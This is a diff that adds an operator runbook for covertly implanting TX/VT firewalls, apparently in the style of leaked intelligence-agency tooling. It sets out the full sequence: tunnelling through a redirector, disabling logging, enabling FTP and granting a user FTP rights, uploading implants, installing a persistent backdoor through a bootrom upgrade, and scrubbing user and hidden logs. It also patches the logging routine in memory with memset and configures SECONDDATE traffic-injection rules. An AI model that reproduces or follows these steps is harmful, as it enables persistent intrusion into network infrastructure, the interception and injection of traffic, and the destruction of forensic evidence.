@@ -1,0 +1,322 @@
+!!! WARNING: Firewall logs everything !!!
+
+## Need to be Level 3 to perform OP
+## Look in sampleman_commands.txt
+## Enabling FTP server and user for TX, must use NOPEN redirection!
+## Need to be Level 3 to perform install
+## Look in sampleman_commands.txt
+## To get system user level 3
+## Use this script for TX & VT
+
+super
+
+## Config will have an easily crackable password
+
+!!! If you see "info-center loghost X.X.X.X" during a sampleman, DO NOT IMPLANT !!! 
+!!! Unless we own the syslog server !!!
+!!! SNMP traps will also log our activity !!!
+!!! SNMP traps going into system-view !!!
+
+#### Everything you need for the op is in firewalls/TURBO directory ####
+#
+### Process of TURBO ###
+0. Key a PolarPaws implant
+1. Establish telnet session, sample_man
+2. Verify/Enable ftp server and users FTP directory, Check for logging
+3. Establish FTP session to Firewall to put up PolarPaws (PBD) and PolarSneeze(InstantGrat)
+4. Establish telnet session, run batch scripts
+5. Restore original configuration (if changed)
+6. Establish LP comms with PandaRock
+7. Key the loaded PolarSneeze implant using PandaRock
+
+### Check updated_scripts for TURBO_build-new.txt to see how to key implant
+
+# create an upload directory for nftp, put polarsneezy & polarpaws files into upload directory
+mkdir /current/bin/FW/TURBO/upload
+cd /current/bin/FW/TURBO/upload
+
+cp /current/bin/FW/TURBO/rekey/bfile.* bfile
+cp /current/bin/FW/TURBO/PP/TX/btest.bat .
+cp /current/bin/FW/TURBO/PS/E1000_VRP330_R0350_03_08/s* .
+chmod 777 *
+
+#### How to telnet to the Firewall ####
+#
+# Must use NOPEN redirection, on redirector:
+-tunnel
+l 2300 TARGET_IP 23
+
+# Run through below sample_man commands
+# If there is no logging, or we own the trap server continue with FTP checks
+# For FTP to work we need to see two things in the config: the server to be enabled, and a 
+# User to be able to FTP
+
+## check VTY line to confirm only user logged in
+
+su 3
+display users
+display version
+display info-center
+
+## if logging enabled ##
+
+system
+undo info-center enable
+quit
+
+display current
+
+## ON REDIRECTOR ##
+## Reminder: Check for SATHOPS!! ##
+
+###########################################################
+## logging is always ON within the hidden history buffer ##
+###########################################################
+
+
+#### How to enable FTP ####
+
+
+# Configuration/System changes must take place in the system-view context, prompt will change to [hostname]
+
+#FTP server enable
+#local-user <user_name> ftp-directory flash:/
+
+system-view
+display info-center
+ftp server enable
+
+#### How to enable FTP for a user ####
+# Verify file directory mount point from dir ran in sampleman
+# From the System-view context, go to the aaa context, prompt will change to [hostname-aaa]
+
+aaa
+local-user <USER> ftp-directory flash:/
+
+# Also give user FTP privs
+# Change <current privs> with the user current privs such as web telnet ssh
+
+local-user <USER> service-type <current privs> ftp
+
+#display AAA configuration information
+
+display aaa configuration
+
+#### How to FTP ####
+#
+# NOPEN comes with nftp, which can redirect the ftp session
+
+# On redirector
+
+-tunnel 12121 udp
+
+# In a local scripted window do this:
+# local directory will be from wherever the command is runcd into the down folder for the firewall
+
+cd /current/bin/FW/TURBO/upload
+nftp -h
+nftp -r REDIRECTOR_IP -N 127.0.0.1 FIREWALL_IP
+
+# Putting up PolarSneeze and PolarPaws for instant accesss
+dir
+put test.bat test.bat
+binary
+put sfile sfile
+put bfile bfile
+dir
+
+# Pulling files
+dir
+bin
+get <file>
+
+
+# Now the instant grat (PolarSneeze) & PBD (PolarPaws) are uploaded
+# DONE with ftp, end your session
+
+quit
+
+
+### !!!! If you enabled ftp, here is how to disable it again, get on with Telnet
+# System view to disable the ftp server, aaa view to remove user ftp setting
+# User local-user command to remove ftp privs if you had to enable them
+
+display users all
+display clock
+system-view
+undo ftp server
+aaa
+undo local-user <USER> ftp-directory
+local-user <user> service-type <privs>
+return
+
+# Redisplay current config to make sure no permit changes
+display current
+
+#### Telnet to execute uploaded batch files ####
+#
+# Get back onto telnet session, super is required for execution 
+
+system-view
+
+### Both version execute polarsneeze the same way!
+execute test.bat
+
+# The install process takes a couple minutes andwill automatically switch from system-view to user view when the install process is done.
+
+# delete sfile and test.bat
+
+delete /unreserved sfile
+delete /unreserved test.bat
+
+
+# Box should be instant grat, a reboot will make the PolarPaws active; return to regular view
+# Note: DO NOT run test.bat if the reboot has occured with PP already active, bad juju.
+
+
+#### Connecting with pandarock to PolarSneeze ####
+#
+# Through NOPEN redirector
+
+-tunnel
+u 3146 <Firewall_IP> 500 3123
+
+./pandarock_v1.10.0.1.bin
+settip 127.0.0.1
+settport 3146
+setsport 3123
+
+# Establish connection with PolarSneeze
+# This will return the NodeNumber (ImplantID)
+ping
+
+# Verify additional implant information
+probe
+
+# Look for in USEFUL ENVIRONMENT DATA
+# Version 25 = PolarPaws
+# Version 26 or 127 = PolarSneeze
+# Module size 0 = no modules loaded
+# Node number = 0x??????
+
+Reading environment from address 0x01fb5878
+
+---------------------------------
+USEFUL ENVIRONMENT DATA
+---------------------------------
+Version             = 127
+Node number         = 0xbeefcafe
+Module size         = 0
+Module function ptr = 0x00000000
+Registry ptr        = 0x01fb5800
+Config area ptr     = 0x00000000
+...
+
+# So your on, now what?
+
+##re-enable info-center
+info-center enable
+quit
+
+## Disable logging with calgon, obviously use the right one
+throttle 1
+ldappl Modules/polarcalgon_tx_v1.4.0.1.bin
+
+## the command tool will change your command context, the following will display scrub commands:
+tool scrub
+
+# Make sure it is alive
+ping
+
+## disable logging, do this before cleaning
+## This will take a snapshot of the current logging setup and prevent logging to console
+dislog
+
+## Run the following commands ON THE FIREWALL
+display clock
+display logbuff
+
+system-view
+_hide
+_display history all
+return
+
+## Install polarpaws by upgrading the bootloader
+system-view
+upgrade bootrom bfile
+display clock
+return
+
+##delete polarpaws (bfile)
+delete /unreserved bfile
+
+# Now, we can scrub the user log and the hidden engineers log
+scrubuser mm/dd/yyyy hh:mm:ss mm/dd/yyyy hh:mm:ss
+scrubhidden mm/dd/yyyy hh:mm:ss mm/dd/yyyy hh:mm:ss
+uninstall
+tool pbd
+unldappl
+
+# clean log files, is now done with calgon
+# IF UNABLE TO USE PandaRock, use this command
+reset logbuffer
+
+# End Telnet session only once the log has been cleaned via CALGON
+quit
+
+
+
+
+# You have successfully implanted an TX or VT firewall!
+
+# Other notes, CALGON will clean up logs, but this is an option until then:
+# Unfortunately, the firewall logs EVERYTHING, so we have to erase it all because we can't modify log memory
+# Reason being is because there are a ton of memset commands that are ran and that feature is not known 
+# to normal people
+# VRP 3.30 release 350.0308
+
+#Disable logging: Note, this command gets logged
+memset 3ac0d8 4 4e800020
+
+#Enable logging
+memset 3ac0d8 4 9421ff60
+
+quit
+
+# All finished
+
+## Using Secondate ##
+#
+## Secondate is an uploadable module, just like other versions, use the client LP program to connect
+
+# load Secondate, currently only for TX, consider setting throttle prior to upload
+ldappl Modules/TX/seconddate-polar_tx_v1.0.0.1.bin
+
+# In a local scripted window, run the SD client, with target ip
+u 1111 FW_IP 500
+./SeconddateClient_1.0.0.2 127.0.0.1:1111
+
+# Verify you can connnect
+ping
+
+# set up a rule, use `help rule` if you need syntax, can only do cmd line, not interactive
+# Must specify a dst address
+
+rule 1 --dstaddr 10.10.10.10 --protocol 6 --dstport 80 --nocheckregex --inject --injectfile inject.me --mininterval 300 --injectwindow 7200 --maxinjections 5
+
+# verify the rule is up and everything is cool.
+showrule -a
+#or
+showrule 1
+
+# enable the rule
+enable 1
+
+# see if it is working
+showrule -s
+showrule 1
+
+# pull back logs
+getlog --logfile log.txt
+
+# remember to always specify a destination IP.
